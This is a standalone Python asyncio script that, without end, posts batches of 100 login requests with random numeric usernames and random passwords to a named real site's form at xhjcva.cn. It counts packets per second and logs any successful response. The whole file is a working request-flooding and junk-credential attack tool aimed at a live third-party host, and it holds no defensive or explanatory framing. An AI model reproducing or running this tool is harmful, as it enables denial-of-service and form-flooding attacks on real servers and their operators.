import sys
import aiohttp
import asyncio

import time
import queue
import _thread
import cprint
import random
import datetime

if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


proxy = 'http://127.0.0.1:8888'
proxy = None

req_url = 'http://xhjcva.cn/web/test.php'
req_headers = {
    'Host':'xhjcva.cn',
    'Proxy-Connection':'keep-alive',
    'Content-Length':'21',
    'Cache-Control':'max-age=0',
    'Upgrade-Insecure-Requests':'1',
    'Origin':'http://ty.xhjcva.cn',
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer':'http://ty.xhjcva.cn/',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.9'
    }

passwd = list('abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*(),./<>?;:"\'[]\\{}|-=_+`~')

def get_body():
    # get a random request body
    rand_u = random.randint(12345678,9999999999)
    random.shuffle(passwd)
    rand_p = ''.join(passwd[:random.randint(5, len(passwd))])
    req_body = f'u={rand_u}&p={rand_p}&bianhao=1'
    return req_body

class statistic_control:
    # a class to statistic pps
    def __init__(self):
        self._cp = cprint.color_print()
        self._start_time = 0.0
        self._now_time = 0.0
        self._sent_packages = 0
        self._message_queue = queue.Queue()
        '''
        [{
            'newline':False,
            'color':'default',
            'content":""
        }]
        '''
        

    def _thread_print(self):
        count = 1
        while 1:
            if not self._working:
                break
            try:
                msg = self._message_queue.get(block=True,timeout=1)
                print(str(datetime.datetime.now())+'\n',*msg['content'],file=open('qk_log','a'))
                if msg['newline']:
                    self._cp(*msg['content'],color=msg['color'])
                else:
                    self._cp('\r',*msg['content'],color=msg['color'],end='')
            except:
                # import traceback
                # print(traceback.print_exc())
                pass
            count += 1
            if count % 3 == 0:
                self._cp('\r package rate {} pps package sent {} timecost {} s '.format(
                    round(self._sent_packages/(time.time() - self._start_time),3),
                    self._sent_packages,
                    round(time.time() - self._start_time,0)
                    ),
                    end='',
                    color='green'
                )
                

            
    def print_msg(self, *msg, newline = True, color = 'default'):
        self._message_queue.put({
            'newline':newline,
            'color':color,
            'content':msg
        })


    def start_work(self):
        self._start_time = time.time()
        self._working = True
        _thread.start_new_thread(self._thread_print,())
    
    def sent_package(self):
        self._sent_packages += 1
    
    def sent_failed(self):
        self._sent_packages -= 1

    def stop_work(self):
        self.print_msg('\nsent',self._sent_packages,'packages in',round(time.time()-self._start_time,0),'seconds',newline=True,color='red')
        time.sleep(1)
        self._working = False
        self._sent_package=0
        self._start_time=0.0
    
sc = statistic_control()


async def get_page(url, headers = None):
    sc.sent_package() # record sent package
    con = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=con) as session:
        async with session.get(url=url, headers=headers, verify_ssl=False,proxy=proxy) as response:
            return (response.status, await response.text())

async def post_page(url, headers, body):
    # headers type dict
    # body type str
    sc.sent_package() # record sent package
    try:
        con = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=con) as session:
            try:
                async with session.post(url=url,headers=headers,data=body.encode(),verify_ssl=False,proxy=proxy,allow_redirects=False,timeout=3) as response:
                    if response.status != 200:
                        return (response.status, await response.text())
                    else:
                        # should be 302
                        sc.print_msg(body, response.status, color='red')
                        return (response.status, await response.text())
            except asyncio.TimeoutError:
                sc.sent_failed() # record sent package failed
                pass
    except aiohttp.client_exceptions.ClientConnectorError:
        sc.print_msg('aiohttp.client_exceptions.ClientConnectorError',color='red')
        return (888,'aiohttp.client_exceptions.ClientConnectorError')
    except aiohttp.client_exceptions.ClientOSError:
        sc.print_msg('aiohttp.client_exceptions.ClientOSError',color='red')
        return (999, 'aiohttp.client_exceptions.ClientOSError')


async def main():
    while True:
        taskList = [post_page(req_url, req_headers, get_body()) for _ in range(100)]
        try:
            await asyncio.gather(*taskList)
        except aiohttp.client_exceptions.ClientConnectorError:
            pass

    sc.print_msg('task finish',color='red')

try:
    sc.start_work()
    if sys.platform == 'win32':
        loop = asyncio.ProactorEventLoop()
    else:
        loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
except KeyboardInterrupt:
    sc.stop_work()
    sys.exit()